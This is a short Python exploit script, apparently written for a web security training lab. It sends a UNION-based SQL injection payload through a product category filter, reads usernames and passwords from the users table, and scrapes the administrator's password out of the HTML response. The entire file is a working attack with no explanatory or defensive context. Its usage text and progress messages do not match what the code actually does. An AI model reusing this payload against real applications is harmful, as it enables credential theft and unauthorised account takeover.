import requests
import urllib3
from bs4 import BeautifulSoup
import time
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'https':'127.0.0.1:8080'}


def exploit_table(url):
    uri = 'filter?category=Lifestyle'
    username = 'administrator'
    sql_payload = "' UNION select username, password from users--"
    r = requests.get(url + uri + sql_payload, verify=False)
    res = r.text
    if username in res:
        print("[+] Found the administrator password.")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print(f"[+] The administrator password is {admin_password}")
        return True
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)
    print(f"[{time.time()}] Figuring out number of columns.")
    if exploit_table(url):
        print("SUCCESS!!!")
    else:
        print("FAILURE!!")

